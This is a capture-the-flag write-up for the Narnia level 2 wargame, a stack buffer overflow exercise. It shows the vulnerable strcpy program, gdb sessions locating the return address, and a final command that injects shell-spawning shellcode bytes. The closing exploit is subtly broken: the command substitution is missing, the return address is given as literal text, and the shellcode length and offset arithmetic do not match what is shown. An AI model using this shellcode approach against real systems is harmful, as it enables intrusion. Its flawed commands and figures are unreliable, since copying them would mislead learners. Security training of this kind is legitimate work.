# Narnia 2

```C
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

So this one requires shellcode like the last one. However the code does not have
a special command that executes it for us. Or does it?!? How about that `return 0`?
We can use that to return into a custom function of our own such as one that
runs code that spawns a shellcode. But where do we put that code. Well in the buffer.
So the first task is seeing how much we need to overflow the return.

In gdb `disass main` to get the leave portion and set that as a break point:
```
0x0804848f <+68>:	call   0x8048300 <printf@plt>
0x08048494 <+73>:	add    esp,0x8
0x08048497 <+76>:	mov    eax,0x0
0x0804849c <+81>:	leave  
0x0804849d <+82>:	ret    
End of assembler dump.
(gdb) break *main+81
```

Note: May need to `set disassembly-flavor intel` to get that good intel syntax

```
(gdb) r $(python -c 'print "A" * 128 + "B"*4 + "C"*4 + "D"*4')
Starting program: /narnia/narnia2 $(python -c 'print "A" * 128 + "B"*4 + "C"*4 + "D"*4')

Breakpoint 1, 0x0804849c in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
```

The return address is at 0x43 word or the 'C' word. (0x43 == 'C')

Then in gdb lets see where buffer starts:

```
(gdb) x/40wx $esp-144
0xffffd5b0:	0x08048534	0xffffd5b8	0x41414141	0x41414141
0xffffd5c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd5d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd5e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd5f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd600:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd610:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd620:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd630:	0x41414141	0x41414141	0x42424242	0x43434343
0xffffd640:	0x44444444	0xffffd600	0xffffd6e0	0x00000000
(gdb)
```

It starts at `0xffffd5b8` so that is our return address.

Now some math: we have `128+4=132` bytes to store our shellcode. So the shellcode is 30 bytes so we need a buffer over flow of 102 bytes.

```
+------------------+---------------------+------------------------+
|                  |                     |                        |
|     shellcode    |   buffer overflow   |   return to shellcode  |
|                  |                     |                        |
+------------------+---------------------+------------------------+
```


Now execute with  python command line.
```
$ ./narnia2 python -c 'print "\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80" + "A"*102 + "0xffffd5b8"'
```
